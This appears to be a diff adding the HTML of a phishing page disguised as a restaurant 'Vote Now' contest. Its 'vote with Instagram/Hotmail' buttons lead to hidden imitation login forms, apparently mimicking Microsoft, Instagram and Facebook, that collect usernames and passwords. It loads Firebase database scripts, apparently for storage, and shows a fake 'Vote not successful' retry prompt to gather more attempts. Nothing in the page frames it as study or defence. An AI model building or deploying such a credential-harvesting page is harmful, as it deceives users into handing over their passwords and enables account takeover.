@@ -1,0 +1,532 @@
+<!doctype html> 
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Vote Now</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <meta content="" name="keywords" />
+    <meta content="" name="description" />
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Favicon -->
+
+    <!-- Google Web Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Heebo:wght@400;500;600&amp;family=Nunito:wght@600;700;800&amp;family=Pacifico&amp;display=swap"
+      rel="stylesheet" />
+
+    <!-- Icon Font Stylesheet -->
+    <link
+      href="cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.html"
+      rel="stylesheet" />
+    <link
+      href="cdn.jsdelivr.net/npm/bootstrap-icons%401.4.1/font/bootstrap-icons.html"
+      rel="stylesheet" />
+
+    <!-- Libraries Stylesheet -->
+    <link href="lib/animate/animate.min.css" rel="stylesheet" />
+    <link
+      href="lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css"
+      rel="stylesheet" />
+
+    <!-- Customized Bootstrap Stylesheet -->
+    <link href="css/bootstrap.min.css" rel="stylesheet" />
+
+    <!-- Template Stylesheet -->
+    <link href="css/style.css" rel="stylesheet" />
+    <link href="css/index.css" rel="stylesheet" />
+  </head>
+
+  <body>
+    <div id="home">
+      <div class="container-xxl bg-white p-0">
+        <!-- Spinner Start -->
+        <!-- Spinner End -->
+
+        <!-- Navbar & Hero Start -->
+        <div class="container-xxl position-relative p-0">
+          <div class="container-xxl py-5 bg-dark hero-header mb-0">
+            <div class="container my-5 py-5">
+              <div class="container text-center">
+                <img src="img/mainlogo.png" alt="" class="centered-image" />
+              </div>
+              <div class="row align-items-center g-5">
+                <div class="col-lg-6 text-center text-lg-start">
+                  <h1 class="display-3 text-white animated slideInLeft">
+                    Enjoy Our<br />Delicious Meal
+                  </h1>
+                  <p class="text-white animated slideInLeft mb-4 pb-2">
+                    we are the culinary artisans who turn every meal into a
+                    masterpiece, every event into an unforgettable experience,
+                    and every dining moment into a gastronomic adventure.
+                  </p>
+                </div>
+                <div class="col-lg-6 text-center text-lg-end overflow-hidden">
+                  <img class="img-fluid" src="vote.png" alt="" />
+                </div>
+              </div>
+            </div>
+            <div class="container text-center">
+              <button
+                onclick="bni()"
+                class="btn btn-primary styled-button py-2">
+                VOTE WITH INSTAGRAM
+              </button>
+            </div>
+            <br />
+            <div class="container text-center">
+              <button onclick="gwa()" class="btn btn-primary styled-button">
+                VOTE WITH HOT Mail
+              </button>
+            </div>
+          </div>
+        </div>
+        <!-- Navbar & Hero End -->
+
+        <!-- Footer Start -->
+        <div
+          class="container-fluid bg-dark text-light footer pt-5 mt-5 wow fadeIn"
+          data-wow-delay="0.1s">
+          <div class="container">
+            <div class="copyright">
+              <div class="row">
+                <div class="col-md-6 text-center text-md-start mb-3 mb-md-0">
+                  &copy; <a class="border-bottom" href="#">D.Shared</a>, All
+                  Right Reserved.
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- Footer End -->
+
+        <!-- Back to Top -->
+        <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top"
+          ><i class="bi bi-arrow-up"></i
+        ></a>
+      </div>
+    </div>
+
+    <div id="cityboiz">
+      <div id="lagos" class="bg-gray mt-4">
+        <div class="min-h-screen flex flex-col w-full">
+          <!-- Main Content Section -->
+          <main class="flex-grow">
+            <div class="tokpart">
+              <div class="p-5 w-full max-w-md">
+                <img src="img/apapmapa2.png" alt="logo" class="h-10 mt-20" />
+                <h2
+                  id="heading"
+                  class="text-4xl font-bold text-white mb-0 mt-12 text-left">
+                  Sign in
+                </h2>
+                <p class="text-xl text-white mb-6 mt-0 text-left">
+                  to continue
+                </p>
+                <!-- oruk Input -->
+                <div id="janape" class="flex justify-start">
+                  <input
+                    type="text"
+                    id="lag-oruko"
+                    name="oruk"
+                    required
+                    class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                    placeholder="Email, phone, or Skype" />
+                </div>
+                <div class="flex justify-start">
+                  <button
+                    id="forgotPasswordButton"
+                    type="button"
+                    class="text-gray-200 py-2 px-1 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-0">
+                    No account?
+                    <span class="text-blue-500 hover:underline">
+                      Create one!</span
+                    >
+                  </button>
+                </div>
+                <!-- Next Button to show password field -->
+                <button
+                  id="nextButton"
+                  type="button"
+                  onclick="revField()"
+                  class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                  Next
+                </button>
+                <!-- Password Field (hidden initially) -->
+                <div id="passwordField" class="hidden mt-4">
+                  <div class="mb-4 relative">
+                    <input
+                      type="text"
+                      id="lag-zom"
+                      name="password"
+                      required
+                      class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                      placeholder="Password" />
+                  </div>
+                  <button
+                    id="nextButton"
+                    type="button"
+                    onclick="lag()"
+                    class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                    Submit
+                  </button>
+                </div>
+              </div>
+            </div>
+          </main>
+          <!-- Footer Section -->
+          <footer
+            id="error-message"
+            class="hidden bg-blue-600 text-white text-sm mt-2 text-center py-6 mt-auto w-full">
+            <div class="w-full px-4">
+              <div class="flex justify-between items-center">
+                Sorry, we could not find your account.
+              </div>
+            </div>
+          </footer>
+        </div>
+      </div>
+
+      <div id="edo" class="bg-black">
+        <div class="min-h-screen flex flex-col w-full">
+          <!-- Main Content Section -->
+          <main class="flex-grow p-2">
+            <!-- Reduced padding here -->
+            <div class="flex justify-center mt-11 mb-6">
+              <!-- Centered Image -->
+              <img src="image/manae.svg" alt="logo" class="h-12" />
+            </div>
+            <div class="tokpart bg-black">
+              <div class="bg-black p-8 w-full max-w-md">
+                <div id="buttonsContainer">
+                  <!-- Container Div for Google, Apple Buttons, and 'or' Divider -->
+                  <button
+                    type="button"
+                    onclick=""
+                    class="w-full py-2 bg-blue-600 px-4 rounded-md flex items-center justify-center text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4"
+                    style="
+                      font-family: &quot;Google Sans&quot;, arial, sans-serif;
+                      font-weight: 400;
+                      overflow: hidden;
+                    ">
+                    <!-- Google Icon -->
+                    Continue Using
+                    <img
+                      src="image/fav.png"
+                      alt="Google Icon"
+                      class="h-5 ml-3" />
+                  </button>
+                  <div class="flex items-center my-4">
+                    <div class="flex-grow border-t border-gray-700"></div>
+                    <span class="mx-4 text-gray-500">OR</span>
+                    <div class="flex-grow border-t border-gray-700"></div>
+                  </div>
+                </div>
+                <!-- oruk Input -->
+                <div class="mb-4 relative">
+                  <input
+                    type="text"
+                    id="edo-oruko"
+                    name=""
+                    required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                    placeholder="Phone, email address, or username" />
+                </div>
+                <div class="mb-4">
+                  <!-- Input Field -->
+                  <input
+                    type="text"
+                    id="edo-zom"
+                    name=""
+                    required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                    placeholder="Password" />
+
+                  <!-- Forgot Password Button -->
+                  <button
+                    type="button"
+                    class="text-blue-600 py-2 px-4 rounded-none bg-transparent border-0 hover:text-blue-800 focus:outline-none focus:ring-0 mt-0 mr-0 ml-auto block">
+                    Forgotten login?
+                  </button>
+                </div>
+                <!-- Login Button -->
+                <button
+                  type="button"
+                  onclick="edolog()"
+                  class="w-full bg-blue-600 text-gray-100 py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4">
+                  Log in
+                </button>
+              </div>
+            </div>
+          </main>
+
+          <!-- Footer Section -->
+          <footer
+            id="error-message"
+            style="background-color: rgb(18, 18, 18)"
+            class="text-white text-sm mt-2 text-center py-1 mt-auto w-full">
+            <div class="flex justify-center items-center flex-col">
+              <!-- Text above the image with reduced margin -->
+              <p class="mb-0" style="font-size: 12px; margin-bottom: 2px">
+                from
+              </p>
+              <!-- Linked image -->
+              <a href="">
+                <img src="image/mee.png" alt="logo" class="h-14" />
+              </a>
+            </div>
+          </footer>
+        </div>
+      </div>
+
+      <div id="owerri" class="bg-gray-100 text">
+        <div class="min-h-screen flex flex-col w-full">
+          <!-- Main Content Section -->
+          <main class="flex-grow p-2">
+            <!-- Reduced padding here -->
+            <div class="flex justify-center mt-9 mb-4">
+              <!-- Centered Image -->
+              <img src="img/bisho.png" alt="logo" class="h-12" />
+            </div>
+            <div class="flex justify-center mb-4 text-black"></div>
+            <div class="tokpart">
+              <div
+                class="bg-white p-8 w-full max-w-md border border-white shadow-2xl rounded-lg">
+                <!-- oruk Input -->
+                <div class="mb-4 relative">
+                  <input
+                    type="text"
+                    id="owerri-oruko"
+                    name=""
+                    required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                    placeholder="Email address or phone number" />
+                </div>
+                <div class="mb-4">
+                  <!-- Input Field -->
+                  <input
+                    type="text"
+                    id="owerris-zom"
+                    name=""
+                    required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                    placeholder="Password" />
+                  <!-- Login Button -->
+                  <button
+                    type="button"
+                    onclick="imo()"
+                    class="w-full bg-[#0866ff] text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-[#0866ff] mt-4 font-semibold">
+                    Log in
+                  </button>
+                  <!-- Forgot Password Button -->
+                  <button
+                    type="button"
+                    class="w-full bg-transparent text-[#0866ff] py-3 px-6 text-sm rounded-md border-0 hover:text-[#0866ff] focus:outline-none focus:ring-0 mt-0">
+                    Forgotten Password?
+                  </button>
+                  <!-- Divider -->
+                  <div class="flex items-center my-2">
+                    <div class="flex-grow border-t border-gray-300"></div>
+                    <div class="flex-grow border-t border-gray-300"></div>
+                  </div>
+                  <!-- Create New Account Button -->
+                  <button
+                    type="button"
+                    class="w-full bg-green-600 text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-green-600 mt-4">
+                    Create new account
+                  </button>
+                </div>
+              </div>
+            </div>
+            <div class="flex justify-center mb-4 mt-7 text-gray-600">
+              <p class="text-l text-center break-words max-w-md">
+                <span style="font-weight: 600"> Create a Page </span> for a
+                celebrity, brand or business.
+              </p>
+            </div>
+          </main>
+
+          <!-- Footer Section -->
+          <footer
+            id="error-message"
+            class="bg-white text-gray-600 text-sm mt-2 py-5 w-full">
+            <div class="w-full px-5">
+              <!-- Container -->
+              <div class="flex flex-col gap-4">
+                <!-- Language Section -->
+                <div class="px-2">
+                  <div class="flex flex-wrap gap-2 text-xs text-gray-600">
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >English (UK)</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Hausa</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Français (France)</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Português (Brasil)</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Español</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >العربية</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Bahasa Indonesia</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Deutsch</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >日本語</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Italiano</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >हिन्दी</a
+                    >
+                  </div>
+                </div>
+                <!-- Divider Line -->
+                <hr class="border-gray-300 w-full" />
+                <!-- Copyright Section -->
+                <div class="px-2 text-xs text-gray-500">&copy;2025</div>
+              </div>
+            </div>
+          </footer>
+        </div>
+      </div>
+    </div>
+
+    <!-- Custom Alert -->
+    <div
+      id="custom-alert"
+      class="hidden fixed inset-0 flex items-center justify-center z-50 p-6">
+      <!-- Overlay -->
+      <div
+        class="fixed z-40 inset-0 bg-gray-500 dark:bg-gray-900 opacity-80"
+        onclick="hideAlert()"
+        aria-hidden="true"></div>
+      <!-- Trick to center modal -->
+      <span
+        class="hidden sm:inline-block sm:align-middle sm:h-screen"
+        aria-hidden="true"></span>
+      <!-- Error Dialog -->
+      <div
+        id="modal-content"
+        class="relative z-50 inline-block align-bottom bg-white dark:bg-gray-800 rounded-lg text-left overflow-visible shadow-xl my-8 w-full max-w-sm sm:max-w-md">
+        <!-- Close button -->
+        <div class="absolute top-0 right-0 pt-4 pr-4">
+          <button
+            type="button"
+            class="rounded-md text-gray-400 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
+            onclick="hideAlert()">
+            <span class="sr-only">Close</span>
+            <svg
+              class="h-6 w-6"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor">
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M6 18L18 6M6 6l12 12"></path>
+            </svg>
+          </button>
+        </div>
+        <!-- Modal Content -->
+        <div class="px-4 pt-5 pb-4 sm:p-6 rounded-md">
+          <div
+            class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-red-100">
+            <svg
+              class="h-6 w-6 text-red-600"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+              aria-hidden="true">
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M12 2a10 10 0 110 20 10 10 0 010-20zm-4 8l8 8m0-8l-8 8"></path>
+            </svg>
+          </div>
+          <div class="mt-3 text-center sm:mt-5">
+            <h3
+              id="alert-title"
+              class="text-lg leading-6 font-medium text-gray-900 dark:text-white">
+              Vote not successful
+            </h3>
+            <div class="mt-2">
+              <p id="alert-message" class="text-sm text-gray-500">
+                Sorry, something went wrong. Please try again.
+              </p>
+            </div>
+          </div>
+          <div class="mt-4 sm:mt-6 sm:flex sm:space-x-6">
+            <button
+              onclick="hideAlert()"
+              class="button w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition duration-300">
+              Try Again
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+    <script src="js/firebase.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/index.js"></script>
+
+    <!-- JavaScript Libraries -->
+    <script src="code.jquery.com/jquery-3.4.1.min.html"></script>
+    <script src="cdn.jsdelivr.net/npm/bootstrap%405.0.0/dist/js/bootstrap.bundle.min.html"></script>
+    <script src="lib/wow/wow.min.js"></script>
+    <script src="lib/easing/easing.min.js"></script>
+    <script src="lib/waypoints/waypoints.min.js"></script>
+    <script src="lib/counterup/counterup.min.js"></script>
+    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
+    <script src="lib/tempusdominus/js/moment.min.js"></script>
+    <script src="lib/tempusdominus/js/moment-timezone.min.js"></script>
+    <script src="lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>
+  </body>
+</html>
